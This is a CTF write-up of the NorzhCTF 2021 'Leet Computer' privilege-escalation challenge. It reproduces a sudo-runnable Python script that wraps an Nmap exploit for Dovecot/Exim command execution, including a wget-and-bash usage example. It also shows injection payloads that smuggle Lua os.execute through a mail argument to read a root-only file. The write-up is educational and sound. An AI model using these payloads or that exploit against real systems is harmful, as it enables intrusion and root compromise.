---
year: 2021
month: 05
day: 24
---
# NorzhCTF 2021 - Leet Computer

## The Challenge

> One of the attacker is still in the airport hall, and it seems that he is still connected to the airport wifi ! Get a root shell on its machine to continue your investigation. This challenge will give you access to another network.
> 
> \- by Masterfox

## Context

NorzhCTF was a hackquest style CTF so we had to complete another challenge first to unlock this. The previous challenge was to get a shell on the 'attacker's machine and this one was a privilege escalation challenge.

## Tl;dr

```sh
./mail_scan.py --ip '010.001.001.001' --mail $'"\nos.execute("cat /root/flag") -- '
```

## How we solved it

For this CTF I was on the Digital Overdose CTF team and my one of my teammates had completed the previous challenge. I was looking around the machine for any obviously exploitable things but I couldn't find much at all. One of my teammates noticed that the user (e11i0t) already had sudo. They ran `sudo -l` and found that the user could only run one file with sudo called `mail_scan.py`. `sudo -l` is quite a useful command that I didn't know about before and I don't think I could have completed the challenge without my teammate introducing it to me (thanks [@revdev1337](https://twitter.com/revdev1337 "Twitter: @revdev1337")). Below is the contents of `mail_scan.py`.

```python
#!/usr/bin/env python3
#coding: utf-8

import argparse
from tempfile import NamedTemporaryFile
from os import system
import re

TEMPLATE_NSE = """
description = [[
Attempts to exploit a remote command execution vulnerability in misconfigured Dovecot/Exim mail servers.

It is important to note that the mail server will not return the output of the command. The mail server
also wont allow space characters but they can be replaced with "${{IFS}}". Commands can also be
concatenated with "``". The script takes care of the conversion automatically.

References:
* https://www.redteam-pentesting.de/en/advisories/rt-sa-2013-001/-exim-with-dovecot-typical-misconfiguration-leads-to-remote-command-execution
* http://immunityproducts.blogspot.mx/2013/05/how-common-is-common-exim-and-dovecot.html
* CVE not available yet
]]

---
-- @usage nmap -sV --script smtp-dovecot-exim-exec --script-args smtp-dovecot-exim-exec.cmd="uname -a" <target>
-- @usage nmap -p586 --script smtp-dovecot-exim-exec --script-args smtp-dovecot-exim-exec.cmd="wget -O /tmp/p example.com/test.sh;bash /tmp/p" <target>
--
-- @output
-- PORT    STATE SERVICE REASON
-- 465/tcp open  smtps   syn-ack
-- |_smtp-dovecot-exim-exec: Malicious payload delivered:250 OK id=XXX
--
-- @args smtp-dovecot-exim-exec.cmd Command to execute. Separate commands with ";".
-- @args smtp-dovecot-exim-exec.auth Authentication scheme (Optional).
-- @args smtp-dovecot-exim-exec.user Authentication username (Optional).
-- @args smtp-dovecot-exim-exec.pwd Authentication password (Optional).
-- @args smtp-dovecot-exim-exec.from Email address to use in the FROM field. Default: nmap+domain. (Optional).
-- @args smtp-dovecot-exim-exec.to Email address to use in the TO field. Default: nmap@mailinator.com
-- @args smtp-dovecot-exim-exec.timeout Timeout value. Default: 8000. (Optional)
-- @args smtp-dovecot-exim-exec.domain Domain name to use. It attempts to set this field automatically. (Optional)
---

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {{"exploit"}}

local smtp = require "smtp"
local shortport = require "shortport"
local stdnse = require "stdnse"

portrule = shortport.port_or_service({{25, 465, 587}},
                {{"smtp", "smtps", "submission"}})


action = function(host, port)
  local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or "uname"
  --Prepare payload
  cmd = string.gsub(cmd, " ", "${{IFS}}")
  cmd = string.gsub(cmd, ";", "``")

  local user = stdnse.get_script_args(SCRIPT_NAME..".user") or nil
  local pwd = stdnse.get_script_args(SCRIPT_NAME..".pwd") or nil
  local from = stdnse.get_script_args(SCRIPT_NAME..".from") or "nmap@"..smtp.get_domain(host)
  local to = "{mail_address}"
  local conn_timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout") or 8000
  local smtp_domain = stdnse.get_script_args(SCRIPT_NAME..".domain") or smtp.get_domain(host)

  local smtp_opts = {{
    ssl = true, timeout = conn_timeout, recv_before = true, lines = 1
  }}
  local smtp_conn = smtp.connect(host, port, smtp_opts)

  local status, resp = smtp.ehlo(smtp_conn, smtp_domain)
  local auth_mech = stdnse.get_script_args(SCRIPT_NAME..".auth") or smtp.get_auth_mech(resp)
  if type(auth_mech) == "string" then
    auth_mech = {{ auth_mech }}
  end

  if (user and pwd) then
    status = false
    stdnse.print_debug(1, "%s:Mail server requires authentication.", SCRIPT_NAME)
    for i, mech in ipairs(auth_mech) do
      stdnse.print_debug(1, "Trying to authenticate using the method:%s", mech)
      status, resp = smtp.login(smtp_conn, user, pwd, mech)
      if status then
        break
      end
    end
    if not(status) then
      stdnse.print_debug(1, "%s:Authentication failed using user '%s' and password '%s'", SCRIPT_NAME, user, pwd)
      return nil
    end
  end

  --Sends MAIL cmd and injects malicious payload
  local from_frags =  stdnse.strsplit("@", from)
  local malicious_from_field = from_frags[1].."`"..cmd.."`@"..from_frags[2]
  stdnse.print_debug(1, "%s:Setting malicious MAIL FROM field to:%s", SCRIPT_NAME, malicious_from_field)
  status, resp = smtp.mail(smtp_conn, malicious_from_field)
  if not(status) then
    stdnse.print_debug(1, "%s:Payload failed:%s", SCRIPT_NAME, resp)
    return nil
  end

  --Sets recipient
  status, resp = smtp.recipient(smtp_conn, to)
  if not(status) then
    stdnse.print_debug(1, "%s:Cannot set recipient:%s", SCRIPT_NAME, resp)
    return nil
  end

  --Sets data and deliver email
  status, resp = smtp.datasend(smtp_conn, "nse")
  if status then
    return string.format("Malicious payload delivered:%s", resp)
  else
    stdnse.print_debug(1, "%s:Payload could not be delivered:%s", SCRIPT_NAME, resp)
  end
  return nil
 end
"""

parser = argparse.ArgumentParser()
parser.add_argument('--ip', required=True, help='IP of the Dovecot to attacc')
parser.add_argument('--mail', required=True, help='Mail address to check')
args = parser.parse_args()

# Arguments validation
ipregex = re.compile('^([0-9]{3}\.){3}[0-9]{3}$')
if not ipregex.match(args.ip):
  print("Error: IP argument is invalid")
  exit(1)

f = NamedTemporaryFile(suffix=".nse")
with open(f.name, "w") as tmp_file:
    tmp_file.write(TEMPLATE_NSE.format(mail_address=args.mail))
system("nmap --script={} '{}'".format(tmp_file.name, args.ip))
```

I read through the code and figured that it was creating an nmap script, saving it to a temp file and running it 🚨 with user supplied input 🚨.

The program took two parameters; ip, and mail. First I checked the ip regex (as the ip was inserted straight into a shell command) and I thought I might be able to get around the check by including a newline in the ip address, however this didn't work as the multiline option was not specified in the regex and therefore the `^` and `$` were the start and end of the string not the line. The payload I tried is below;

```sh
# the regex is a bit weird so the components of the ip all have to be three digits
sudo ./mail_scan.py --ip $'010.001.001.001\n; echo hi' --mail 'blah'
```

Circumventing the regex didn't work however I could verify that inserting a newline into the argument had worked.

Next I looked at how `args.mail` was being used and found that it was getting inserted straight into the nmap script with no sanitisation. I tried injecting a quotation mark into the mail parameter and it did indeed throw an error when running the nmap script.

Nmap scripts are written in lua so I just injected a call to `os.execute` to read the flag. This means that if nmap finds an open mail port we get the flag, all I had to do now was point it at a server with a mail port open.

```sh
./mail_scan.py --ip '010.001.001.001' --mail $'"\nos.execute("cat /root/flag") -- '
```

And there you go, we have the flag; `NORZH{e11i0t_1s_s0_1337!!}`

## What I learnt

1. `sudo -l` is really useful for finding what commands a user can run as root
2. it is trivial to add newlines to command line arguments
3. DONT EVER USE UNSANITISED USER INPUT

## Conclusion

This challenge was a nice confidence boost after working away at 3 other challenges and not being able to solve any of them.

Overall NorzhCTF was a very unique competition and I found the hackquest style quite interesting, however I still prefer jeopardy style CTFs for now because they are more beginner friendly.
